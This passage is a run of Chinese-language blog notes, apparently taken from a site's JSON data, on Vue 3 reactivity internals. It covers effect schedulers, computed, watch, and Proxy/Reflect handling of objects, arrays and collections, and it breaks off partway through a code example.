，end... ，2\n```\n\n### 10.2. 示例 2：合并操作\n\n如下代码\n\n```js\nconst data = {foo: 1};\nconst obj = new Proxy(data, {});\n\neffect(\n    () => {\n        console.log(obj.foo);\n    }\n);\n\nobj.foo++;\nobj.foo++;\nobj.foo++;\nobj.foo++;\n\n// ::::顺序： 1 2 3 4 5 \n```\n\n如果我只打印 `初始值` 和 `最终值`呢？\n\n>  其实就有点类似于 **React 中的 setState 多次或者 Vue 中的连续改变响应式数据。**\n\n#### 10.2.1. 微任务队列\n\n所以，关键是 需要 **实现一个微任务队列，并去重，并且如何保证一个微任务队列里，只执行一次**，如下代码：\n\n```js hl:12,4,1,22\n// 任务队列，使用 Set 方便去重\nconst jobQueue = new Set()\n// 标识是否正在刷新微任务队列，\n// 如果正在刷新，则不再执行 flushJob，所以一个事件循环中只会执行一次 flushJob\nlet isFlushing = false\n// 利用 promise ，保证 flushJob 在一个事件循环中只执行一次\nfunction flushJob() {\n  if (isFlushing) return\n  isFlushing = true;\n  // 将一个函数添加到微任务队列中\n  Promise.resolve().then(() => {\n    // 这个时候，取出来的 job 是已经去重过的了，所以不会重复执行了\n    jobQueue.forEach(job => job())\n  }).finally(() => {\n    isFlushing = false\n  })\n}\n\neffect(() => {\n  console.log(obj.foo)\n}, {\n  // 使用 scheduler 选项，去重任务后，再刷新执行微任务队列的函数\n  scheduler(fn) {\n    // 使用 Set 来去重\n    jobQueue.add(fn);\n    // 刷新微任务队列\n    flushJob()\n  }\n})\n```\n\n### 10.3. 更多参考后文\n\n> [9. Vue3 中 effect 的调度选项（scheduler）使用示例](/post/bZBkBVeg.html)\n\n## 11. 计算属性 `computed` 实现原理与 `lazy`\n\n### 11.1. 懒执行\n\n以下代码是`立即执行`的，如何实现代码 `lazy 执行` 呢？如下代码：\n\n```js\nconst data = {foo: 1};\nconst obj = new Proxy(data, {});\neffect(\n    () => {\n        console.log(obj.foo); // ::::立即执行\n    }\n);\n```\n\n添加 `options.lazy = true`, 使得 `effect` 不会立即执行 ? 如下代码：\n\n```js\neffect(\n    () => {\n        console.log(obj.foo); // ::::不立即执行\n    },\n    // ::::options.lazy = true 时不立即执行\n    {lazy: true}\n);\n```\n\n改造 `effect函数` 代码如下：\n\n![|496](https://od-1310531898.cos.ap-beijing.myqcloud.com/202304091113904.png)\n\n> **延迟执行，往往都是返回一个函数，这和柯里化函数很像**\n\n但是，上面的代码，仅仅能够`手动执行` ，如下代码：\n\n![|360](https://od-1310531898.cos.ap-beijing.myqcloud.com/202304091118724.png)\n\n如果 `fn` 为 `getter函数`呢？ 如下：\n\n![|512](https://od-1310531898.cos.ap-beijing.myqcloud.com/202304091121697.png)\n\n上面代码能否再抽象成 `computed` ? 这就引出了 `computed`\n\n### 11.2. `computed` 计算属性 → ==只有读取时，才会计算==\n\n- 计算属性的 `懒计算`，即 `只有读取时，才会计算`\n- 多次读取一个属性时，还需要做到 `缓存`，避免`多次计算`\n\t- 通过脏变量 `dirty`来标识，**类似于 Angular 的概念**。\n- 如果`计算属性发生变化会重新触发渲染` ， 但是如果一个计算属性依赖另外一个计算属性时，会发生 `effect 嵌套`\n\t- 所以，每次读取计算属性时，需要`手动触发 trigger 追踪` \n\n![|576](https://od-1310531898.cos.ap-beijing.myqcloud.com/202304091154769.png)\n\n所以，上面的代码会建立响应联动关系如下：\n\n- `computed(obj)`\n\t- `value`\n\t\t- `effectFn`\n\n即，你就把 `对于computed嵌套，当做是两个副作用函数的嵌套来理解`，就对了！\n\n> [!info]  \n真正还是需要看代码去，说真的，自己手写实现完整的功能，得实现多久啊！！，这就是业务代码和真正技术代码的区别吧！\n\n>[!tip]  \n所以，**这里基本思路掌握即可，不用装牛角尖**，也不可能让你段时间内徒手写出来，需要的话就去自己看代码。\n\n### 11.3. 为什么使用 computed 时，具体值都需要使用`.value`来包装\n\n仔细看上面的截图代码的第 2 行，就知道了\n\n## 12. `watch函数` 的实现原理\n\n### 12.1. 简单实现\n\n通过前面我们知道，副作用函数重新执行时，`可调度` ，所以 我们把调度里，加个`回调`，就能实现，如下代码：\n\n![|576](https://od-1310531898.cos.ap-beijing.myqcloud.com/202304091223151.png)\n\n上面代码硬编码了 `source.foo` 的读取操作，更通用的解法：`递归读取对象的所有属性`\n\n### 12.2. 相对完善的实现\n\n就想想如何使用 `watch` 函数的？ 所以，需要支持一下功能：\n\n- watch 入参支持`三个`，想想是 哪三个？\n\t- `第一个`参数 支持 `getter 函数` 和 `对象`\n\t- `第二个`参数，回调函数里支持 `newVal` 和 `oldVal`\n\t- `第三个`自定义参数 `options`\n\n下面是 `watch 函数`的代码  \n\n![|840](https://od-1310531898.cos.ap-beijing.myqcloud.com/202304091242677.png)\n\n> [!tip]  \n注意，上面代码**高亮的部分** ，另外 `flush` 的值 `pre` 和 `post` 代表**组件更新前和更新后**，后面会涉及到具体原理，这里不深究。\n\n### 12.3. 回调的第三个参数？\n\n```typescript hl:4\ntype WatchCallback<T> = (\n  value: T,\n  oldValue: T,\n  onCleanup: (cleanupFn: () => void) => void\n) => void\n\n```\n\n先看一个例子，如果 `watch` 一个 `obj 对象`，改变了就发请求，如下：\n\n![|696](https://od-1310531898.cos.ap-beijing.myqcloud.com/202304091258200.png)\n\n所以，会存在`过期的副作用函数`，`第三个参数`就是解决这种`竞态问题`的 ，以下是代码实现：\n\n![|576](https://od-1310531898.cos.ap-beijing.myqcloud.com/202304091303363.png)\n\n注意上面代码的 **高亮部分**\n\n下面是 **使用实例**：\n\n![|568](https://od-1310531898.cos.ap-beijing.myqcloud.com/202304091304118.png)\n\n所以，最终的效果如下：\n\n![|560](https://od-1310531898.cos.ap-beijing.myqcloud.com/202304091306983.png)\n\n## 13. 最后\n\n>[!warning]  \n强调下，这一章很难啃的，但层层递进的思想比代码本身更重要，具体如何实现，代码最终如何编写实现，远远没有理解来龙去脉重要。**最终代码都有，多些思考与理解，装牛角尖意义不大**\n\n## 14. 参考\n\n- 《Vue.js设计与实现》\n- [https://github.com/HcySunYang/code-for-vue-3-book](https://github.com/HcySunYang/code-for-vue-3-book)","bZBkBVeg":"\n# Vue3 中 effect 的调度选项（scheduler）使用示例\n\n`#vue3` `#R1` \n\n\n>  平时在使用 vue 来实现业务逻辑时，记得可以通过这种方式来**优化性能**，实现和 React 一样的渲染优先级的调度效果，切记！\n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 注意 effect 的==详细 API== ，往下看\n\t- `scheduler` 函数接收原始的 `effect 函数`作为参数\n\t- `scheduler` 可以控制 `effect` 的执行时机和方式\n\t- 如果提供了 `scheduler`，effect 的重新执行将由 `scheduler` 来控制\n\t- scheduler 可以用于实现高级功能如`防抖、节流、异步更新`等\n\t- 在清理组件时记得`停止 effect 以防内存泄漏`\n- 自定义队列调度，更多==看下面示例==\n\t- 批量调度\n\t- 优先级调度\n\t- 防抖等\n\n## 2. 先看看 effect 函数的完整定义、参数、返回值\n\n### 2.1. 完整参数说明\n\n```typescript hl:22\nimport { effect, reactive } from 'vue'\n\n// 创建响应式对象\nconst state = reactive({\n  count: 0\n})\n\n// effect 的完整使用示例\nconst runner = effect(\n  // 第一个参数：效果函数\n  () => {\n    console.log('count is:', state.count)\n    return state.count // 可以有返回值\n  },\n  \n  // 第二个参数：配置选项\n  {\n    // 是否延迟执行，默认 false\n    lazy: false,\n    \n    // 调度器函数\n    scheduler: (run) => {\n      console.log('scheduler called')\n      run()\n    },\n    \n    // 效果作用域\n    scope: undefined,\n    \n    // 是否允许递归调用，默认 false\n    allowRecurse: false,\n    \n    // 停止时的回调函数\n    onStop: () => {\n      console.log('effect stopped')\n    }\n  }\n)\n```\n\n### 2.2. 返回值详解\n\n```typescript hl:13,14\n// runner 函数的使用\nconst runner = effect(() => {\n  return state.count * 2\n})\n\n// 1. 直接调用执行效果函数\nconst result = runner() // 返回计算结果\n\n// 2. 访问 effect 实例\nconst effectInstance = runner.effect\n\n// 3. 使用 effect 实例的方法\nrunner.effect.stop() // 停止响应式追踪\nrunner.effect.run()  // 手动运行效果\n```\n\n## 3. 基础使用示例\n\n```javascript hl:11\nimport { effect, ref } from 'vue'\n\nconst count = ref(0)\n\n// 创建一个effect，带有自定义调度器\neffect(() => {\n  console.log(count.value)\n}, {\n  scheduler: (run) => {\n    // run 是原始的 effect 函数\n    console.log('scheduler called')\n    // 可以选择何时运行 effect\n    run()\n  }\n})\n```\n\n## 4. 异步调度示例\n\n```javascript hl:8\nconst count = ref(0)\n\n// 将effect执行放入异步队列\neffect(() => {\n  console.log(count.value)\n}, {\n  scheduler: (run) => {\n    Promise.resolve().then(run)\n  }\n})\n```\n\n## 5. 防抖示例\n\n```javascript hl:11\nimport { effect, ref } from 'vue'\nimport { debounce } from 'lodash'\n\nconst searchQuery = ref('')\n\n// 创建一个防抖的effect\neffect(() => {\n  // 搜索逻辑\n  console.log('Searching for:', searchQuery.value)\n}, {\n  scheduler: debounce((run) => {\n    run()\n  }, 300)\n})\n```\n\n## 6. 批量更新示例 \n\n```javascript hl:9\nconst count = ref(0)\nlet runs = 0\n\neffect(() => {\n  console.log(count.value)\n}, {\n  scheduler: (run) => {\n    // 使用 requestAnimationFrame 批量处理更新\n    requestAnimationFrame(() => {\n      runs++\n      console.log(`Running effect, times: ${runs}`)\n      run()\n    })\n  }\n})\n```\n\n## 7. 批量更新示例 2\n\n```javascript hl:14,9\nconst list = ref([])\nlet pending = false\nconst updates = new Set()\n\neffect(() => {\n  console.log('List updated:', list.value)\n}, {\n  scheduler: (run) => {\n    updates.add(run)\n    \n    if (!pending) {\n      pending = true\n      Promise.resolve().then(() => {\n        updates.forEach(update => update())\n        updates.clear()\n        pending = false\n      })\n    }\n  }\n})\n\n// 批量添加数据\nlist.value.push(1)\nlist.value.push(2)\nlist.value.push(3)\n```\n\n## 8. 条件调度示例\n\n```javascript hl:8\nconst count = ref(0)\nlet shouldRun = true\n\neffect(() => {\n  console.log(count.value)\n}, {\n  scheduler: (run) => {\n    if (shouldRun) {\n      run()\n    } else {\n      console.log('Effect execution skipped')\n    }\n  }\n})\n```\n\n## 9. 错误处理\n\n```javascript hl:7\nconst count = ref(0)\n\neffect(() => {\n  console.log(count.value)\n}, {\n  scheduler: (run) => {\n    try {\n      run()\n    } catch (error) {\n      console.error('Effect execution failed:', error)\n    }\n  }\n})\n```\n\n## 10. 实际应用场景\n\n```javascript hl:10,24\n// 在组件中使用\nimport { effect, ref, onMounted, onUnmounted } from 'vue'\n\nexport default {\n  setup() {\n    const data = ref(null)\n    let stop\n\n    onMounted(() => {\n      // 创建可清理的effect\n      stop = effect(() => {\n        // 数据处理逻辑\n        processData(data.value)\n      }, {\n        scheduler: (run) => {\n          // 使用 requestIdleCallback 在空闲时执行\n          requestIdleCallback(() => {\n            run()\n          })\n        }\n      })\n    })\n\n    onUnmounted(() => {\n      // 清理effect\n      if (stop) stop()\n    })\n  }\n}\n```\n\n## 11. 优先级调度示例 1\n\n```javascript\nconst highPriorityQueue = []\nconst lowPriorityQueue = []\n\nconst count = ref(0)\n\neffect(() => {\n  console.log(count.value)\n}, {\n  scheduler: (run) => {\n    if (isHighPriority()) {\n      highPriorityQueue.push(run)\n      flushHighPriorityQueue()\n    } else {\n      lowPriorityQueue.push(run)\n      scheduleFlushLowPriorityQueue()\n    }\n  }\n})\n```\n\n## 12. 优先级调度示例 2\n\n```javascript hl:12\nconst data = ref(null)\nconst loading = ref(false)\nconst error = ref(null)\n\n// 高优先级更新 - 立即执行\neffect(() => {\n  console.log('Loading status:', loading.value)\n}, {\n  scheduler: (run) => run()\n})\n\n// 低优先级更新 - 使用 requestIdleCallback\neffect(() => {\n  console.log('Data processed:', data.value)\n}, {\n  scheduler: (run) => {\n    requestIdleCallback(() => run())\n  }\n})\n```\n\n## 13. 组合调度器示例\n\n```javascript hl:2\n// 创建组合调度器\nfunction createCompositeScheduler(...schedulers) {\n  return (run) => {\n    schedulers.forEach(scheduler => scheduler(run))\n  }\n}\n\nconst count = ref(0)\n\n// 组合防抖和错误处理\neffect(() => {\n  console.log('Count:', count.value)\n}, {\n  scheduler: createCompositeScheduler(\n    debounce((run) => run(), 300),\n    (run) => {\n      try {\n        run()\n      } catch (error) {\n        console.error(error)\n      }\n    }\n  )\n})\n```\n\n## 14. 自定义队列调度示例\n\n```javascript hl:5\nclass QueueScheduler {\n  queue = []\n  flushing = false\n\n  add(run) {\n    this.queue.push(run)\n    this.flush()\n  }\n\n  flush() {\n    if (this.flushing) return\n    this.flushing = true\n\n    Promise.resolve().then(() => {\n      while (this.queue.length) {\n        const run = this.queue.shift()\n        run()\n      }\n      this.flushing = false\n    })\n  }\n}\n\nconst scheduler = new QueueScheduler()\n\nconst counter = ref(0)\n\neffect(() => {\n  console.log('Counter:', counter.value)\n}, {\n  scheduler: (run) => scheduler.add(run)\n})\n```\n\n## 15. 最佳实践\n\n1. 对于频繁更新的数据，使用防抖或节流\n2. 对于大量计算，考虑使用异步调度，比如\n3. 对于批量更新，使用 `requestAnimationFrame`\n4. 需要清理的 `effect` 要在**组件卸载时停止**\n5. 合理使用错误处理确保应用稳定性","jKi9dCol":"\n# Vue3 的非原始值响应式方案（Map、WeakMap 、Set 、WeakSet ）\n\n\n`#vue原理` `#vue原理` \n\n\n前文 [8. Vue3 的响应式原理：effect、computed、watch 的实现原理](/post/RID6FvlT.html) 注意讲了基本的响应式方案\n\n本文，主要讲解更复杂场景 ，比如\n- 如何拦截 `for-in` ?\n- 如何拦截 `Map WeakMap  Set  WeakSet` 等？\n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n> 重点：==查阅 JavaScript 语言规范==\n\n### 1.1. 基本原理\n\n- Vue 的响应式数据是基于 Proxy 实现的\n\t- Proxy 可以为其他对象创建一个代理对象\n\t- 在实现代理的过程中，我们遇到了访问器属性的 `this 指向`问题，这需要使用 `Reflect.* 方法`并指定正确的 `receiver` 来解决。\n- 在 ECMAScript 规范中，JavaScript 中有两种对象，\n\t- 其中一叫作`常规对象`\n\t- 另一种叫作`异质对象`。\n- 代理 `Object对象` 的本质， 就是**查阅规范**并找到可拦截的基本操作的方法。\n\t- 有一些操作并不是基本操作，而是**复合操作**\n\t- 这需要我们查阅规范了解它们都依赖哪些基本操作，从而通过基本操作的拦截方法**间接**地处理复合操作。\n- 添加、修改、删除属性对 `for...in` 操作的影响\n\t- `添加和删除`属性都会影响 `for...in` 循环的`执行次数`，所以当这些操作发生时，需要触发与 `ITERATE_KEY` 相关联的副作用函数重新执行。\n\t- `修改`属性值则不影响 `for...in` 循环的执行次数，因此无须处理。\n- 如何合理地触发副作用函数重新执行，包括\n\t- 对 `NaN` 的处理，\n\t\t- 对于 `NaN`，我们主要注意的是`NaN === NaN`永远等于false\n\t- 访问**原型链上的属性导致的副作用函数**重新执行两次的问题\n\t\t- 对于原型链属性问题，需要我们查阅规范定位问题的原因。\n\t- 由此可见，想要基于 `Proxy` 实现一个相对完善的响应系统，**免不了去了解 ECMAScript 规范**。\n- 深响应与浅响应，以及深只读与浅只读。\n\t- 这里的深和浅指的是对象的层级\n\t- 浅响应(或只读)\n\t\t- 代表**仅代理一个对象的第一层属性**，即只有对象的第一层属性值是响应(或只读)的\n\t- 深响应(或只读)则恰恰相反\n\t\t- 为了实现深响应(或只读)，我们需要在返回属性值之前，对值做一层包装，将其包装为响应式(或只读) 数据后再返回\n\n### 1.2. 数组的代理\n\n- 数组是一个`异质对象`，因为数组对象部署的内部方法 `[DefineOwnProperty](/post/jKi9dCol.html#DefineOwnProperty)` 不同于常规对象。\n- 很多隐式对象的属性，触发响应的时候需要额外注意，比如\n\t- 通过`索引`为数组设置新的元素，可能会隐式地改变数组 `length` 属性的值。\n\t- 对应地，修改数组 `length` 属性的值，也可能会间接影响数组中的已有元素。\n- 如何拦截 `for...in` 和 `for...of` 对数组的遍历操作：**只需要跟踪拦截数组的 length** ，下面是原因\n\t- 使用 `for...in` 循环遍历数组与遍历普通对象区别不大，唯一需要注意的 是，当追踪 for...in 操作时，应该使用`数组的 length` 作为追踪的 key。\n\t- `for...of` 基于迭代协议工作，数组内建了 `Symbol.iterator` 方法。\n\t\t- 数组迭代器执行时，会读取数组的 length 属性或数组的索引。因此，我们不需要做其他额外的处理，就能够实现对 for...of 迭代的响应式支持。\n- 数组的查找方法。如 `includes`、indexOf 以及 lastIndexOf 等\n\t- 对于数组元素的查找，需要注意的一点是：\n\t\t- **用户既可能使用代理对象进行查找，也可能使用原始对象进行查找。**\n\t- 为了支持这两种形式，我们需要**重写数组的查找方法**。\n\t- 原理很简单，当用户使用这些方法查找元素时，我们可以先去代理对象中查找，如果找不到，再去原始数组中查找。\n- 栈溢出问题\n\t- 即 `push、pop、 shift、unshift 以及 splice` 等方法。\n\t\t- 调用这些方法会间接地读取 和设置数组的 `length` 属性\n\t\t- 因此，在不同的副作用函数内对同一个 数组执行上述方法，会导致多个副作用函数之间循环调用，最终导致调用**栈溢出**。\n\t- 为了解决这个问题，我们使用一个标记变量 `shouldTrack` 来代表是否允许进行追踪，\n\t\t- 然后重写了上述这些方法， 目的是，当这些方法间接读取 length 属性值时，我们会先将 shouldTrack 的值设置为 false，即禁止追踪。\n\t- 这样就可以断开 length 属性与副作用函数之间的响应联系，从而避免循环调用导致的调用栈溢出\n\n### 1.3. 集合类型的响应式方案\n\nVue3 依然使用 Proxy 来实现对 Map 和 Set 的拦截，但实现方式比普通对象更复杂\n-  Vue3 为 Map 和 Set 创建了特殊的处理器（`handlers`）\n\t- ==你可以理解为 使用`对象&函数`包装了 Map 和 Set==\n\n\n--- \n\n\n- 集合类型指 Set、Map、WeakSet 以及 WeakMap\n\t- 例如，集合类型的 size 属性是一个**访问器属性**，当通过代理对象访问 size 属性时\n\t\t- 由于代理对象本身并没有部署 `[SetData](/post/jKi9dCol.html#SetData)` 这样的**内部槽**，所以会发生错误\n\t- 另外，通过代理对象执行集合类型 的操作方法时，要注意这些方法执行时的 this 指向\n\t\t- 我们需要在 **get 拦截函数内通过 .bind 函数**为这些方法绑定正确的 `this 值`。\n- 集合类型响应式数据的实现\n\t- 我们需要通过“**重写**”集合方法的方式来实现自定义的能力，\n\t- 当 Set 集合的 add 方法执行时，需要调用 `trigger` 函数触发响应\n- 数据污染\n\t- 指的是不小心将响应式数据添加到原始数据中，它导致用户可以通过原始数据执行响应式相关操作，这不是我们所期望的\n\t- 为了避免这类问题发生\n\t\t- 我们通过响应式数据对象的 `raw 属性`来访问对应的原始数据对象，后续操作使用原始数据对象就可以了。\n- 集合的 `forEach` 方法与对象的 `for...in` 遍历类似，最大的不同体现在在于\n\t- 当使用 `for...in` 遍历对象时，我们只关心对象的键是否变化，而不关心值\n\t- 但使用 `forEach` 遍历集合时，我们既关心键的变化，也关心值的变化\n\n## 2. 先看看 `Proxy` 与 `Reflect`\n\n### 2.1. 基本操作\n\n拦截对象的 `读 get 、取 set`   \n\n```javascript\nconst obj = {foo: 1}\n\nconst p = new Proxy(obj, {\n    get() {\n        return obj.foo\n    },\n    set(target, key, value) {\n        obj[key] = value\n    }\n})\n```\n\n拦截函数的`调用 apply`\n\n```javascript hl:6\nconst fn = (name) => {\n    console.log('我是：', name)\n}\n\nconst p2 = new Proxy(fn, {\n    apply(target, thisArg, argArray) {\n        target.call(thisArg, ...argArray)\n    }\n})\n```\n\n### 2.2. 复合操作\n\n读取一个对象的方法，如 `obj.fn()` ， 分两步：\n- 先 `get` 读取 `obj.fn`\n- 然后`apply` 调用，`obj.fn()`\n\n### 2.3. Reflect\n\n![|496](https://832-1310531898.cos.ap-beijing.myqcloud.com/89f6df0dbb53ae4746460d060a860c99.png)\n\n> `Reflect` 与 `Proxy` 的 API 一一对应，比如 `get / set / apply` 等\n\n`Reflect` 还接受`第三个参数`，如下：\n\n![|728](https://832-1310531898.cos.ap-beijing.myqcloud.com/6f6465918bdc361e993206a4b58d401d.png)\n\n前文 [8. Vue3 的响应式原理：effect、computed、watch 的实现原理](/post/RID6FvlT.html) 的` Effect` 函数，如果对于下面的数据结构有问题，`无法正常收集响应信息`。这时候就需要用到 `Reflect 的第三个参数了`\n\n```javascript hl:3\nconst obj = {\n  foo: 1,\n  get bar() {\n     return this.foo\n  }\n}\n```\n\n## 3. Javascript 对象 与 Proxy 对象\n\n### 3.1. 如何判断是 `普通对象` 还是`函数对象`\n\nJS 中一切都是对象，函数也是对象，那么如何区分呢？\n- 对象真正语义由`内部方法`实现，即对对象进行某个操作时，`引擎内部`实际调用的方法，对用户是不可见的\n\n![|808](https://832-1310531898.cos.ap-beijing.myqcloud.com/facf27b921187c6c77f36e11511f2d2d.png)\n\n如上图，是常规对象 的 `内部方法`，下面是`函数对象的内部方法`\n\n![|800](https://832-1310531898.cos.ap-beijing.myqcloud.com/5ffa20e66f443a16309655b8ae9201c4.png)\n\n所以，根据是否部署 `[Call](/post/jKi9dCol.html#Call)` 方法，就可以判断是 `普通对象` 还是`函数对象` \n\n> [https://262.ecma-international.org/#sec-ordinary-and-exotic-objects-behaviours](https://262.ecma-international.org/#sec-ordinary-and-exotic-objects-behaviours)\n\n### 3.2. `常规对象` 与 `异质对象`\n\nES 规范，JS 中有`两种对象`：\n\n- `常规对象`\n- `异质对象`： \n\t- 如 Proxy 对象，如下图：\n\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/a519e54f6ddf360657463d503143b1ca.png)\n\n- `[Call](/post/jKi9dCol.html#Call)` 和 `[construct](/post/jKi9dCol.html#construct)` 两个内部方法**只有被代理对象是函数和构造函数时**才会调用\n- 内部方法的`多态性` 即 普通对象 和 Proxy 都有 `[Get](/post/jKi9dCol.html#Get)` ，但规范定义是完全不同的。\n\n> [https://262.ecma-international.org/#sec-proxy-object-internal-methods-and-internal-slots](https://262.ecma-international.org/#sec-proxy-object-internal-methods-and-internal-slots)\n\n### 3.3. 示例：代理 `delete` 操作\n\n所以根据以上可知，可通过**下面**的方式 `拦截删除属性操作` \n\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/29799983481927d8818c33386d0b94e6.png)\n``\n> [!bug]\n注意：需要删除被 `proxy` 的对象，才会拦截，如下图，下面的方式就不会\n**自己丢到坑里了，搞了一会，才发现都写错了** ， `delete.p` 才行\n\n\n![|720](https://832-1310531898.cos.ap-beijing.myqcloud.com/b125b5237dd8ce6ea39f9e95e472d7fa.png)\n\n## 4. 如何代理 Object\n\n如何拦截对象的`一切读取操作`，比如\n- 访问属性：`obj.foo` ， `obj['foo']`\n\t- `Proxy get`\n- `in`操作符：`foo in obj`\n\t- 根据 ECMA-262 中，in 操作符运算时的逻辑，通过 `Proxy has` 拦截\n- 遍历：`for(const key in obj)`\n\t- 还是通过规范可知，使用` Proxy ownKeys 操作` 可拦截\n- 删除某个属性： `delete p.foo`\n\t- 通过看规范可知，可通过拦截 `Proxy deleteProperty ` 拦截\n- 等等。。。\n\n所以，结论就是：首先需要`查阅规范`，找到可拦截的方法，另外一些`复合操作`，依赖于一些基本操作，我们需要分析，通过拦截`基本操作`，达到`间接拦截复合操作`的目的。\n\n另外，比如 添加、删除属性时对 `for-in` 的`执行次数`有影响，需要定义 `const ITERATE_KEY = Symbol()`，即`遍历key` 与 副作用函数相关联，避免重复执行。\n\n> [!info]\n 更多的参考代码，不展开了，真正需要的时候再说吧！\n\n### 4.1. 合理的触发响应\n\n如下代码：期望改变 `p.foo` 时，触发 `effect` 函数\n\n```javascript\nconst obj = {foo:0}\nconst p = reactive(obj);\n\neffect(() => {\n    console.log(p.foo);\n})\n\np.foo = 1;\np.foo = 2;\np.foo = 3;\n\n```\n打印如下：\n![|256](https://832-1310531898.cos.ap-beijing.myqcloud.com/583cf5d8cf0ab1a883d7a49d63b4a3d2.png)\n\n然而，`NaN === NaN` 永远为 `false` ，需要兼容。如下图：\n\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/e0dfc40ac7fec65a89882cd170810a47.png)\n\n最后，访问`原型链上的属性`，可能会导致副作用执行两次的问题，也需要解决。\n\n```javascript\nconst obj = {foo: 0};\nconst proto = {bar: 1};\n\nconst child = reactive(obj);\nconst parent = reactive(proto);\n\nObject.setPrototypeOf(child, parent);\n\neffect(() => {\n    console.log(child.bar);\n})\n\nchild.bar = 2;\n```\n\n所以，代理对象是一个大工程，这里不展开了，以后真正有实际应用场景，再来看`源代码`。\n\n## 5. 深响应与浅响应 、深只读 与 浅只读\n\n`深浅`是指：\n- `浅`代表`只读或只响应`对象的`第一层`属性，\n- `深`则相反，我们需要，我们需要再返回属性值，之前对值进行递归包装，包装成`响应式`的再返回。\n\n如下图：修改嵌套内层的 `bar属性`，也应该触发副作用函数\n\n![|644](https://832-1310531898.cos.ap-beijing.myqcloud.com/53a08f4b30bc2b6d8a8d9247b6de2c82.png)\n\n所以，我们需要再递归再返回属性值，如下图：\n\n![|656](https://832-1310531898.cos.ap-beijing.myqcloud.com/009b93436fd03c02c033d8c930b0f27f.png)\n\n如下代码：\n\n```javascript\nimport {createApp, reactive, effect,readonly} from 'vue'\nconst obj = readonly({ text1: 'text1', text2: 'text2' });\nobj.text2 = 1; // [Vue warn] Set operation on key \"text2\" failed: target is readonly\n```\n\n执行会警告：如下图\n\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/37944aa17e10affab4b6854774631b0e.png)\n再者，`只读数据`不应该和副作用函数`建立响应关系`。如何实现呢？\n\n## 6. 对于数组的代理\n\n数组是`异质对象`，因为数组对象的 `[DefineOwnproperty](/post/jKi9dCol.html#DefineOwnproperty)` 内部方法与常规对象不同。\n- 通过`索引`直接设置新的元素，可能会`隐式`的改变数组的 `length` 值\n- 修改 `length` 值，也可能会影响 `已有元素`\n- `for-in`遍历对象与普通对象区别不大，可使用 `length` 作为追踪的 `key`\n- 使用 `for-of` 时，会读取数组的 `Symbol.iterator` 的方法。\n- 另外对于数组的查找方法：\n\t- 用户可能会对`代理数组对象`进行查找，当然也可能对`原始对象`进行查找，所以我们`重写了`数组的查找方法。\n\n所以，首先，我需要知道 `读取` 和 `写入` 操作都有哪些？\n\n对于数组所有可能的`读取操作`有哪些？\n- `arr[0]`\n- length\n- for-in \n- for-of\n- 不改变原数组的方法：\n\t- 如 some /find 、includes 等等\n\n对于数组所有可能的`设置操作`有哪些？\n\n- `arr[0]=1`\n- `length=0`\n- 栈方法：\n\t- push pop 等等，它还会`隐式`修改 `length`\n- 改变原数组的方法：\n\t- 如 `spice 、sort  、fill` 等\n\n然后，去查文档，看看每个操作后面的调用逻辑是什么？再有针对性的去跟踪建立响应。\n为什么我们要重写` includes` 、 `indexOf` 和 `lastIndexof` 呢？\n\n- 以 includes 为例，查阅语言规范，我们发现\n   - 这个方法的执行流程中使用了`数组的对象属性的一面`去查找属性，所以 `this` 指向这个`对象`，所以 `reacttive(obj)` 每次都很返回一个新的对象，所以 this 指向肯定有问题。所以我们需要重写 `includes`,\n      - 如何重写呢，即拦截` arr 对象`的 `includes 属性` ，及看 `includes` 是否存在于`arrayInstrumentations`中，如下代码\n\n```javascript\nconst arrayInstrumentations = {}\n\n;['includes', 'indexOf', 'lastIndexOf'].forEach(method => {\n  const originMethod = Array.prototype[method]\n  arrayInstrumentations[method] = function(...args) {\n    // this 是代理对象，先在代理对象中查找，将结果存储到 res 中\n    let res = originMethod.apply(this, args)\n\n    if (res === false) {\n      // res 为 false 说明没找到，在通过 this.raw 拿到原始数组，再去原始数组中查找，并更新 res 值\n      res = originMethod.apply(this.raw, args)\n    }\n    // 返回最终的结果\n    return res\n  }\n})\n```\n\n下面看看为什么重写栈方法：如 `push`，看下面示例：\n\n> 你可以想想，语言规范里，调用 `push` 肯定有一步是修改 `length` 的\n\n```javascript\nconst arr = reactive([]);\n// ::::第一个 effect\neffect(() => {\n    arr.push(1); // 间接读取 length,所以会建立依赖\n})\n// ::::第二个 effect\neffect(() => {\n\t// 间接读取 length,还会间接修改 length, 然后就执行第 一 已经建立好的effect，然后就死循环了，导致栈溢出\n    arr.push(1); \n})\n```\n\n上面的代码会`栈溢出` ，解决方案是：使用全局变量 `shouldTrack` 来禁止追踪，断开 length 属性 与 副作用函数的响应联系。\n\n```javascript\nlet shouldTrack = true\n;['push','unshift','pop'].forEach(method => {\n  const originMethod = Array.prototype[method]\n  arrayInstrumentations[method] = function(...args) {\n    shouldTrack = false\n    // 调用原始方法之前\n    let res = originMethod.apply(this, args)\n    // 调用原始方法之后，恢复，允许追踪\n    shouldTrack = true\n    return res;\n  }\n})\n```\n\n以下代码实现`不追踪`：\n\n```javascript\nfunction track(target, key) {\n  if (!activeEffect || !shouldTrack) return\n}\n```\n\n`pop 、 shift、unshift 、splice` 等方法类似。\n\n## 7. 对于 Set 和 Map 的代理\n\n可以想想 `Set` 和 `Map` 对应的属性和方法有哪些？\n\n- size clear keys values() entries() 等等\n\n同样的你还是需要去查语言规范\n- 比如 `size` 是一个访问器属性，语言规范里规范有 `this` 执行的步骤，所以直接通过代理对象访问，会导致报错，这时候你需要去兼容，如去拦截 `get()` ，然后`bind` 正确的 `this 值`\n\n其实 `delete()` 也是同样的道理\n\n很多思路类似，比如代理迭代器属性和方法，比如 `for in` 和 `foreach` ，又比如需要去看看文档规范里 `entries keys 和 values` 是如何定义的\n\n另外需要避免数据污染的问题，即把`响应式数据`设置到`原始数据`上的行为。我们可以通过响应式对象的 `row`属性来访问`原始对象`\n\n## 8. 对于 Proxy 对象\n\n### 8.1. Vue 3 对 Proxy 的处理原则\n\nVue 3 在处理 Proxy 对象时遵循以下原则：\n\n1. 如果检测到目标对象已经是 Proxy，则直接返回该对象\n2. 避免重复代理\n3. 保持原始 Proxy 的行为\n\n### 8.2. 源码实现分析\n\nVue 3 中的关键实现（简化版）：\n\n```javascript\n// reactive.js\nfunction reactive(target) {\n  // 如果不是对象，直接返回\n  if (!isObject(target)) {\n    